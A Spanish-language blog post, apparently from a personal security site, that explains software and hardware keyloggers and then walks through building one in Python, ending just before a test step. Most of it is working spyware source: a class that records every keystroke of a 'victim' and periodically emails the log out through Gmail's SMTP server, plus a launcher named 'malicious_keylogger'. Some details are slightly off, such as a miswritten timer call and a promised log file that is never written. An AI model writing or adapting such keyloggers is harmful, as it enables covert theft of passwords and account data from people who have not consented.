---
layout: single
title: "Entendiendo los keyloggers: teoría y creación de un keylogger básico en Python"
excerpt: "En este post, aprenderás acerca de los conceptos básicos de los keyloggers, así como sobre cómo crear un keylogger básico en Python. A través de la creación de una herramienta de este tipo, aprenderás sobre la captura de entrada del usuario, el manejo de flujos de datos y la transmisión de información en tiempo real. Aunque es importante mencionar que los keyloggers son considerados una herramienta peligrosa y su uso indebido puede ser ilegal y violar la privacidad de las personas. "
date: 2022-06-30
classes: wide
header:
 teaser: /assets/images/keylogger/keylogger.png
 teaser_home_page: true
categories:
  - Programación
tags:
  - seguridad
  - spyware
  - colombia
  - python
  - malware
---

<p align="center" >
<img src='/assets/images/keylogger/keylogger.png' width='300' height='300'/>
</p>

Un Keylogger es un pequeño programa diseñado para capturar todas las pulsaciones que son realizadas por un teclado, para guardarlas en un registro que puede verse luego en un ordenador local, o puede ser enviado con rapidez y seguridad a través de Internet a un equipo remoto. Sin embargo los keyloggers no siempre se basan en _software_, sino que tambien pueden estar basados en _hardware_, mas adelanto explico cada uno, pero en este post nos enfocaremos en el keylogger basado en software ya que capturaremos la escritura de teclas de la victima.

A pesar de ser usado mayormente para actividades ilicitas, los keyloggers tambien tienen un uso positivo en las empresas, ayudando en el control parental o el analisis interno de las mismas. En definitiva los keyloggers son tecnologias que nos permiten realizar un seguimiento y registrar cada tecla o pulsacion  tacil que se realiza en algun dispositivo electronico.

# Tipos de keylogger
Existen 2 tipos los cuales seran resumidos:

## Keylogger basado en software 
Este keylogger se trata de un programa ejecutable, que actúa como espía o virus, escrito en Python y es instalado en cualquier dispositivo electrónico con teclado para rastrear la escritura realizada con este. Normalmente, se instala sin consentimiento del usuario y realiza el registro de las pulsaciones del teclado e inclusive realiza capturas de pantalla, esto con el fin de obtener datos de acceso como por ejemplo los números de cuentas y sus contraseñas.

Posterior a esto, los datos capturados son guardados en un archivo que se le suele llamar `log.txt` y luego es enviado al atacante via correo electronico o talvez el archivo solo es guardado en el equipo local o enviado a un equipo remoto, siendo estas las tipologias de _keylogger_ mas comunes.

## Keylogger basado en hardware
Este keylogger de tipo _hardware_ suele implementarse a travez de firmware a nivel de BIOS o, alternativamente atravez de un dispositivo microelectronico conectado en linea entre en teclado de computadora y una computadora.

# Como se crea un keylogger basico?
El proposito de este post es con fines educativos, no me responsabilizo del uso que hagan con el. Con esta entrada quiero ensenar **como crear un keylogger con el lenguaje python**, este keylogger va guardar cada pulsacion de tecla y va almacenar esta informacion en un archivo de texto, Despues de x pulsaciones, el keylogger enviara un correo a una direccion especifica con el archivo adjunto.

Para que este keylogger funcione debemos hacer uso de algunas librerias o modulos de python las cuales son las siguientes: 

- smtplib: Este modulo o libreria define un objeto de sesion de cliente SMTP que se puede usar para enviar correos a cualquier maquina de internet con un demonio de escucha SMTP.
- re: Este modulo nos proporciona operaciones de conicidencia de expresiones regulares.
- subprocess: Este modulo permite invocar procesos desde python y comunicarse con ellos, es decir enviar datos a la entrada `stdin` y recibir la informacion de salida `stdout`.
- pynput: Esta biblioteca nos permite controlar y monitorear/escuchar los dispositivos de entrada como el teclado y el mouse.
- threading: Este modulo construye interfaces de hilado de alto nivel sobre el modulo de mas bajo nivel.

Ya sabiendo esto, pasamos a escribir el codigo donde usaremos tambien programacion orientada a objetos y despues sera explicar por partes el codigo.

```python
#!/usr/bin/env python
import smtplib
import threading
from pynput import keyboard

#create keylogger class
class KeyLogger:

  #definimos init variables 
  def __init__ (self, time_interval, email, password):
    self.interval = time_interval
    self.log = "[!] Keylogger has started..."
    self.email = email
    self.password = password

  # creamos el archivo log
  def append_to_log(self, string):
    self.log = self.log + string

  # creamos el keylogger
  def on_press(self, key):
    try:
      current_key = str(key.char)
    except AttributeError:
      if key == key.space:
        current_key = " "
      elif key == key.esc:
        print("[!] Exiting program...")
        return False
      else:
        current_key = " " + str(key) + " "
    
    self.append_to_log(current_key)

  # creamos la estructura trasera del mail
  def send_mail(self, email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

  # creamos el reporte y el envio del mail
  def report_and_sendmail(self):
    send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
    self.log = ""
    timer = threading.timer(self.interval, self.report_and_sendmail)
    timer.start()

  # start keylogger and send off mail
  def start(self):
    keyboard_listener = keyboard.Listener(on_press = self.on_press)
    with keyboard_listener:
      self.report_and_sendmail()
      keyboard_listener.join()
```
Como creamos una clase, pasamos a crear el archivo python que va ejecutar el keylogger

```python
import keylogger

#inicializamos
malicious_keylogger = keylogger.KeyLogger(10, 'test@gmail.com', '123456789')

#ejecutamos
malicious_keylogger.start()
```

Ahora pasamos a probar el keylogger
